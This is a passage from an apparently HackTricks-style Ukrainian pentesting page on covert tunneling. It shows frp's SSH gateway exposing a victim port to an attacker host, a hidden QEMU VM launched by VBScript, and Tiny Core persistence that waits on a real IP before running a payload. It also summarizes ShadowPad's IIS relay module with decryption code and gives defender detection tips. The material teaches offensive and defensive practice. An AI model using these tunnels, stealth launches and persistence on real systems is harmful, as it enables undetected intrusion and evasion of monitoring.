### Використання нового SSH-шлюзу (без бінарного файлу frpc)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
Наведена вище команда публікує порт жертви **8080** як **attacker_ip:9000**, використовуючи стандартний клієнт OpenSSH, тоді як `frps` надає gateway.<sup>[[50]](#references)</sup>

## Приховані тунелі на базі VM з QEMU

Мережа користувацького режиму QEMU не потребує root або адміністративних привілеїв для віртуальної мережі, а `-netdev user,hostfwd=...` перенаправляє TCP-, UDP- або UNIX-з'єднання з host до guest.<sup>[[51]](#references)</sup> TrustedSec задокументувала Tiny Core QEMU VM і невдалу спробу reverse SSH tunnel під час інциденту, у якому EDR, орієнтований на host, міг не помітити активність усередині guest.<sup>[[1]](#references)</sup>

### Швидкий one-liner
```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• Наведена вище команда запускає гостьову систему **Tiny Core Linux** із 256 MiB гостьової пам’яті та дисковим образом qcow2; дисковий образ не є диском у RAM.
• Порт **2222/tcp** на хості Windows прозоро перенаправляється до **22/tcp** усередині гостьової системи.
• З погляду атакувальника ціль просто відкриває порт 2222; усі пакети, що до нього надходять, обробляються SSH-сервером, запущеним у VM.

### Прихований запуск через VBScript

TrustedSec зафіксувала запуски QEMU, керовані через VBS, і образи Tiny Core у згаданому вище інциденті.<sup>[[1]](#references)</sup>
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Запуск скрипта за допомогою `cscript.exe //B update.vbs` залишає вікно прихованим.<sup>[[1]](#references)</sup>

### Персистентність усередині гостьової системи

У наведеному описі інциденту йдеться про персистентність у статeless-гостьовій системі Tiny Core через `/opt/bootlocal.sh` і `/opt/filetool.lst`:<sup>[[1]](#references)</sup>

1. Записати payload до `/opt/123.out`
2. Додати до `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Додати `home/tc` і `opt` до `/opt/filetool.lst`, щоб під час завершення роботи payload було запаковано до `mydata.tgz`.

### Зауваження щодо телеметрії

• На хості все ще видно процес QEMU, образ qcow2 і будь-який listener, проброшений через хост.
• Сканування процесів лише на хості може не перевіряти процеси гостьової системи, але віртуалізація не гарантує ухилення від виявлення; мережева телеметрія, телеметрія QEMU та образу все одно може його викрити.<sup>[[1]](#references)[[51]](#references)</sup>

### Поради для захисників

• Створюйте alert для **неочікуваних бінарних файлів QEMU/VirtualBox/KVM** у шляхах, доступних для запису користувачам.
• Блокуйте вихідні з'єднання, які ініціюються з `qemu-system*.exe`.
• Шукайте рідкісні listening ports (2222, 10022, …), які починають прослуховуватися одразу після запуску QEMU.

## Relay-вузли IIS/HTTP.sys через `HttpAddUrl` (ShadowPad)

Check Point описує модуль IIS у ShadowPad як механізм, що перетворює скомпрометовані perimeter web-сервери на backdoor- і relay-вузли, прив'язуючи префікси URL через `HttpAddUrl`.<sup>[[3]](#references)</sup>

У тому ж звіті детально описано defaults, wildcard listeners, розшифрування пакетів, relay queues і debug telemetry, узагальнені нижче.<sup>[[3]](#references)</sup>

* **Config defaults** – якщо JSON config модуля не містить певних значень, використовуються правдоподібні defaults IIS (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Завдяки цьому на benign traffic IIS відповідає з коректним branding.
* **Wildcard interception** – оператори вказують список префіксів URL, розділених крапкою з комою (wildcards у host + path). Модуль викликає `HttpAddUrl` для кожного запису, тому HTTP.sys передає matching requests шкідливому handler; nonmatching requests повертаються до стандартної поведінки IIS.
* **Encrypted first packet** – перші два bytes body запиту містять seed для custom 32-bit PRNG. Кожен наступний byte перед protocol parsing проходить XOR із згенерованим keystream:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Relay orchestration** – модуль підтримує два списки: “servers” (upstream nodes) і “clients” (downstream implants). Записи видаляються, якщо heartbeat не надходить протягом приблизно 30 секунд. Коли обидва списки непорожні, модуль поєднує перший healthy server із першим healthy client і просто передає bytes між їхніми sockets, доки одна зі сторін не закриє з'єднання.
* **Debug telemetry** – optional logging записує source IP, destination IP і загальну кількість forwarded bytes для кожного pairing. Дослідники використали ці breadcrumbs, щоб відновити ShadowPad mesh, розгорнуту на кількох victims.

---

## Інші tools для перевірки

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Приховування в тінях: covert tunnels через QEMU virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – До ToolShell: дослідження попередніх ransomware-операцій Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Усередині Ink Dragon: розкриття relay network і внутрішньої роботи stealthy offensive operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Evil-WinRM README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Довідник Nmap: обхід обмежень Firewall/IDS](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [Посібник OpenBSD ssh](https://man.openbsd.org/ssh)
- [7] [Посібник OpenBSD sshd_config](https://man.openbsd.org/sshd_config)
- [8] [Примітки до випуску OpenSSH 9.6](https://www.openssh.org/txt/release-9.6)
- [9] [sshuttle README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: Pivoting у Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Документація модуля Metasploit socks_proxy](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Документація модуля Metasploit autoroute](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [reGeorg README](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [Chisel README](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ng Quickstart](https://docs.ligolo.ng/Quickstart/)
- [18] [Ligolo-ng Listeners](https://docs.ligolo.ng/Listeners/)
- [19] [Ligolo-ng Localhost](https://docs.ligolo.ng/Localhost/)
- [20] [rpivot README](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [Посібник socat](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [Посібник PuTTY Plink](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [Опції командного рядка PuTTY](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Команда Microsoft netsh interface portproxy](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [SocksOverRDP README](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Документація Proxifier](https://www.proxifier.com/docs/win-v4/)
- [27] [Правила Proxification у Proxifier](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [Посібник OpenVPN 2.7](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [YARP README](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [iodine README](https://code.kryo.se/iodine/README.html)
- [32] [dnscat2 README](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [dnscat2-powershell README](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [proxychains-ng README](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: доменні імена – реалізація та специфікація](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [ptunnel-ng README](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [ngrok Agent CLI](https://ngrok.com/docs/agent/cli)
- [40] [Інтерфейс веб-інспекції ngrok](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [Віртуальні hosts ngrok](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [ngrok Agent Config v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Огляд Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/)
- [44] [Параметри origin Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Налаштування Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Файл конфігурації Cloudflare Tunnel](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Параметри запуску Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [Концепції frp](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [Документація щодо networking у QEMU](https://www.qemu.org/docs/master/system/devices/net.html)
{{#include ../banners/hacktricks-training.md}}
